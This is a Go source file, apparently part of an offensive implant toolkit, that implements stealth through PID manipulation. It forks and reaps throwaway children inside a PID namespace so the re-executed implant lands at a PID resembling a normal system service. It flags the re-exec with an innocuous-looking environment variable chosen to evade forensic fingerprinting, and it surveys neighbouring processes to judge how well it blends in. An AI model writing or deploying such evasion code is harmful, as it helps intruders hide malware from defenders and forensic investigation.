package stealth

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// PIDStrategy defines how we want to manipulate our PID.
type PIDStrategy int

const (
	// PIDBlendHigh forks until we get a PID in a high, busy range (500+)
	// where system services typically live.
	PIDBlendHigh PIDStrategy = iota
	// PIDBlendTarget forks until we land near a specific target PID.
	PIDBlendTarget
	// PIDAvoidLow consumes low PIDs (1-50) by forking children that persist,
	// pushing our operational PID into normal ranges.
	PIDAvoidLow
)

// PIDManipConfig controls PID manipulation behavior.
type PIDManipConfig struct {
	Strategy  PIDStrategy
	TargetPID int // For PIDBlendTarget — aim near this PID
	MinPID    int // Minimum acceptable PID
	MaxPID    int // Maximum acceptable PID (0 = no max)
	MaxForks  int // Safety limit on fork attempts
}

// DefaultPIDConfig returns a config that avoids suspicious low PIDs.
func DefaultPIDConfig() *PIDManipConfig {
	return &PIDManipConfig{
		Strategy: PIDBlendHigh,
		MinPID:   100,
		MaxPID:   0,
		MaxForks: 200,
	}
}

// ManipulatePID performs fork-based PID manipulation inside a PID namespace.
// Inside a PID namespace, the first process is PID 1 — which screams "container init".
// This function forks child processes to consume low PIDs, then re-execs the implant
// at a PID that looks like a normal system service.
//
// OPSEC: Must be called INSIDE the PID namespace, BEFORE any operational work.
// The consumed PIDs are held by zombie children that we reap after re-exec.
func ManipulatePID(cfg *PIDManipConfig) (int, error) {
	currentPID := os.Getpid()

	// If we're already in an acceptable range, do nothing
	if isPIDAcceptable(currentPID, cfg) {
		return currentPID, nil
	}

	// Fork children to consume PIDs until we reach the target range.
	// Each child immediately exits. We are PID 1 in the namespace so
	// we must reap them or they become zombies.
	consumed := 0
	for consumed < cfg.MaxForks {
		pid, _, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
		if errno != 0 {
			return currentPID, fmt.Errorf("fork failed: %v", errno)
		}

		if pid == 0 {
			// Child: exit immediately via raw syscall to avoid Go runtime corruption.
			// os.Exit() would run Go cleanup in the forked child, corrupting parent state.
			syscall.RawSyscall(syscall.SYS_EXIT, 0, 0, 0)
		}

		// Parent: reap the child
		var ws syscall.WaitStatus
		syscall.Wait4(int(pid), &ws, 0, nil)

		consumed++

		// Check if the NEXT pid (our re-exec) would be in range.
		// The kernel typically assigns monotonically increasing PIDs in a namespace.
		nextExpectedPID := int(pid) + 1
		if isPIDAcceptable(nextExpectedPID, cfg) {
			break
		}
	}

	// Now re-exec ourselves. The new process gets the next available PID.
	return reExecSelf()
}

// isPIDAcceptable checks if a PID falls within the configured acceptable range.
func isPIDAcceptable(pid int, cfg *PIDManipConfig) bool {
	if pid < cfg.MinPID {
		return false
	}
	if cfg.MaxPID > 0 && pid > cfg.MaxPID {
		return false
	}

	switch cfg.Strategy {
	case PIDBlendTarget:
		// Accept if within +/- 20 of target
		diff := pid - cfg.TargetPID
		if diff < 0 {
			diff = -diff
		}
		return diff <= 20
	case PIDBlendHigh:
		return pid >= cfg.MinPID
	case PIDAvoidLow:
		return pid > 50
	}
	return true
}

// reExecSelf re-executes the current binary with the same args and env.
// The new process inherits our namespace memberships but gets a new PID.
func reExecSelf() (int, error) {
	exe, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return os.Getpid(), err
	}

	// Pass a marker so the re-exec'd process knows it already manipulated PID.
	// Use an innocuous-looking env var name to avoid forensic fingerprinting.
	env := os.Environ()
	env = append(env, "LC_PAPER_SIZE=1")

	err = syscall.Exec(exe, os.Args, env)
	// If Exec returns, it failed
	return os.Getpid(), err
}

// PIDAlreadyManipulated checks if we've already been through PID manipulation.
func PIDAlreadyManipulated() bool {
	if os.Getenv("LC_PAPER_SIZE") == "1" {
		os.Unsetenv("LC_PAPER_SIZE") // clean up marker immediately
		return true
	}
	return false
}

// GetPIDRange reads /proc/sys/kernel/pid_max to understand the PID space.
func GetPIDRange() int {
	data, err := os.ReadFile("/proc/sys/kernel/pid_max")
	if err != nil {
		return 32768 // default
	}
	val, err := strconv.Atoi(strings.TrimSpace(string(data)))
	if err != nil {
		return 32768
	}
	return val
}

// AnalyzePIDNeighborhood looks at PIDs near ours to assess how well we blend.
// Returns the names of neighboring processes.
func AnalyzePIDNeighborhood(radius int) map[int]string {
	neighbors := make(map[int]string)
	myPID := os.Getpid()

	for pid := myPID - radius; pid <= myPID+radius; pid++ {
		if pid <= 0 || pid == myPID {
			continue
		}
		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			continue
		}
		neighbors[pid] = strings.TrimSpace(string(comm))
	}

	return neighbors
}
